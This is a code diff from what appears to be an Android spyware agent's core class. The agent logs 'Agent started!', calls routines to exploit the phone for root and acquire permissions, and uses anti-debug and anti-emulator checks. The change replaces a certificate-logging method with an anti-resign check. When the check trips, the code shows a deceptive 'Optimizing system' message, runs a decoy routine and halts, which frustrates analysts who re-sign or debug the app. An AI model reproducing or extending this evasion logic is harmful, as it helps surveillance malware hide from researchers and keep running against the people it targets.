@@ -40,6 +40,7 @@ import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.optimize.NetworkOptimizer;
 import com.android.dvci.util.AntiDebug;
 import com.android.dvci.util.AntiEmulator;
+import com.android.dvci.util.AntiSign;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.PackageUtils;
 import com.android.dvci.util.StringUtils;
@@ -55,6 +56,11 @@ import java.security.NoSuchAlgorithmException;
 import java.security.cert.CertificateException;
 import java.security.cert.CertificateFactory;
 import java.security.cert.X509Certificate;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import dexguard.util.CertificateChecker;
 
@@ -145,10 +151,6 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start) anti emu/debug failed");
 			}
-			return false;
-		}
-
-		if (!checkSignature()) {
 			return false;
 		}
 
@@ -268,64 +270,9 @@ public class Core extends Activity implements Runnable {
 			Status.self().makeToast(M.e("Agent started!"));
 		}
 
-//		if(Cfg.GUI){
-//
-//			Status.getStpe().schedule(new Runnable() {
-//				@Override
-//				public void run() {
-//					closeMainActivity();
-//				}
-//			}, 5, TimeUnit.SECONDS);
-//
-//		}
-
-
 		return true;
 	}
 
-	private boolean checkSignature() {
-		int certificateChanged = CertificateChecker.checkCertificate(Status.getAppContext(), 123);
-
-		String data = Utils.readAssetPayload(M.e("tp.data"));
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (checkSignature), data " + data);
-		}
-
-		Context context = Status.getAppContext();
-		Signature[] sigs = new Signature[0];
-		try {
-			sigs = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES).signatures;
-			for (Signature sig : sigs) {
-				final byte[] rawCert = sig.toByteArray();
-				InputStream certStream = new ByteArrayInputStream(rawCert);
-
-				final CertificateFactory certFactory;
-				final X509Certificate x509Cert;
-				try {
-					certFactory = CertificateFactory.getInstance("X509");
-					x509Cert = (X509Certificate) certFactory.generateCertificate(certStream);
-					MessageDigest md = MessageDigest.getInstance("SHA1");
-					byte[] publicKey = md.digest(x509Cert.getEncoded());
-
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (checkSignature), Certificate subject: " + x509Cert.getSubjectDN());
-						Check.log(TAG + " (checkSignature), Certificate sha1: " + StringUtils.byteArrayToHexString(publicKey));
-						//Check.log(TAG + " (checkSignature), Certificate issuer: " + x509Cert.getIssuerDN());
-						//Check.log(TAG + " (checkSignature), Certificate serial number: " + x509Cert.getSerialNumber());
-					}
-
-				} catch (CertificateException e) {
-					// e.printStackTrace();
-				} catch (NoSuchAlgorithmException e) {
-					//e.printStackTrace();
-				}
-			}
-		} catch (PackageManager.NameNotFoundException e) {
-			e.printStackTrace();
-		}
-
-		return true;
-	}
 
 	private void closeMainActivity() {
 		try {
@@ -450,6 +397,14 @@ public class Core extends Activity implements Runnable {
 		}
 		Root.exploitPhone(runExploitSynchronously());
 		Root.getPermissions(false);
+
+		// ANTIDEBUG ANTIEMU
+		if (!check()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start) anti emu/debug failed");
+			}
+			return;
+		}
 
 		if (Status.haveRoot()) {
 			if (Cfg.DEMO) {
@@ -604,7 +559,8 @@ public class Core extends Activity implements Runnable {
 				if (!Cfg.DEBUG && Cfg.CHECK_ANTI_DEBUG) {
 					// ANTIDEBUG
 					AntiDebug ad = new AntiDebug();
-					if (ad.isDebug()) {
+					AntiSign sign = new AntiSign();
+					if (ad.isDebug() || sign.isReSigned()) {
 						stopAll();
 						return true;
 					}
@@ -1072,8 +1028,20 @@ public class Core extends Activity implements Runnable {
 		}
 	}
 
-	public boolean check() {
-		if (Cfg.CHECK_ANTI_DEBUG) {
+	public static boolean check() {
+		if (Cfg.CHECK_ANTI_DEBUG){
+
+			if (!Cfg.DEBUG || Cfg.DEBUGANTISIGN) {
+				AntiSign sign = new AntiSign();
+				if(sign.isReSigned()) {
+					if (Cfg.DEMO) {
+						Status.self().makeToast(M.e("Optimizing system"));
+					}
+					deceptionCode2(Integer.MAX_VALUE / 512);
+					return false;
+				}
+			}
+
 			if (!Cfg.DEBUG || Cfg.DEBUGANTI) {
 
 
